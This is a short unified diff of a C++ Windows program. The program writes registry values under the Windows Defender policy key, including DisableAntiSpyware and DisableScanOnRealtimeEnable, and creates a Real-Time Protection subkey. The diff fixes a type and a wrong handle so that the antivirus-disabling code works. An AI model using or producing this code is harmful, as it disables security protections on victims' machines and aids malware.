@@ -1,6 +1,6 @@
 #include <iostream>
 #include <Windows.h>
-#include <securitybaseapi.h>
+
 
 using namespace std;
 
@@ -45,7 +45,7 @@ int main(void){
 				HKEY addnkey;
 				
 				
-				LSTATUS rok = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &addkey);
+				LONG rok = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &addkey);
 				if(rok == ERROR_SUCCESS){
 						RegSetValueEx(addkey, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
 						
@@ -61,7 +61,7 @@ int main(void){
 						
 						RegSetValueEx(addkey, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
 						
-						RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &addnkey, 0);
+						RegCreateKeyEx(addkey, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &addnkey, 0);
 						
 						
 						RegCloseKey(addkey);
